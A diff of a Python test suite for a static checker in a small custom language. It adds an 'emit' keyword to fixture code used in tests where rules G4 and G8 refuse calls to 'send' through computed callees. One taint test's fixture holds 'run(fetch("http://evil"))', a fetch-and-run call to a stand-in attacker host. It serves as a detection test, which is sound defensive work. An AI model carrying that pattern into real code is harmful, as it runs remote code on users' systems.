@@ -74,7 +74,7 @@ def _plain_service(dispatch_body: str, extra: str = "",
     return (_SEND + extra
             + f"fn dispatch(x: Str) -> Str {{ {dispatch_body} }}\n"
             + f"service S {{ {decl} }}\n"
-            + "component C provides s: S { provide s { fn calc(a) = dispatch(a) } }\n")
+            + "component C provides s: S { provide s { fn calc(a) = emit dispatch(a) } }\n")
 
 
 # --------------------------------------------------------------- the walk
@@ -135,7 +135,7 @@ def test_the_direct_form_is_refused_identically_the_asymmetry_is_gone():
              + "fn dispatch(x: Str) -> Str { return send(x) }\n"
              + "service S { fn calc(a: Str) -> Str }\n"
              + "component C provides s: S "
-             + "{ provide s { fn calc(a) = dispatch(a) } }\n", "G4")
+             + "{ provide s { fn calc(a) = emit dispatch(a) } }\n", "G4")
 
 
 def test_the_emitting_fixed_point_reaches_the_dispatching_fn():
@@ -165,7 +165,7 @@ def test_g4_refuses_a_ternary_selected_handler():
                "{ return (b ? send : other)(x) }\n"
              + "service S { fn calc(a: Str) -> Str }\n"
              + "component C provides s: S "
-               "{ provide s { fn calc(a) = dispatch(true, a) } }\n", "G4")
+               "{ provide s { fn calc(a) = emit dispatch(true, a) } }\n", "G4")
 
 
 def test_g4_refuses_an_index_selected_handler_table():
@@ -175,7 +175,7 @@ def test_g4_refuses_an_index_selected_handler_table():
                "{ return [send, other][i](x) }\n"
              + "service S { fn calc(a: Str) -> Str }\n"
              + "component C provides s: S "
-               "{ provide s { fn calc(a) = dispatch(0, a) } }\n", "G4")
+               "{ provide s { fn calc(a) = emit dispatch(0, a) } }\n", "G4")
 
 
 # ------------------------------------------- F1c: the `emission[caps]` bound
@@ -232,7 +232,7 @@ _G8_ADMITTED = (_SEND
                 + "fn dispatch(x: Str) -> Str { return [send][0](x) }\n"
                 + "service S { emission fn calc(a: Str) -> Str }\n"
                 + "component C provides s: S "
-                  "{ provide s { fn calc(a) = dispatch(a) } }\n")
+                  "{ provide s { fn calc(a) = emit dispatch(a) } }\n")
 
 
 def test_the_g8_audit_reports_the_boundary_behind_a_computed_callee():
@@ -303,7 +303,7 @@ def test_taint_sink_nested_in_a_computed_callee_is_checked():
         "fn ident(n: Int) -> (Str) -> Int { return len_of }\n")
     tail = ("service Ops { emission fn go(u: Str) -> Int }\n"
             "component A provides ops: Ops "
-            "{ provide ops { fn go(u) = f(u) } }\n")
+            "{ provide ops { fn go(u) = emit f(u) } }\n")
     nested = (prelude
               + 'fn f(s: Str) -> Int { return ident(run(fetch("http://evil")))(s) }\n'
               + tail)
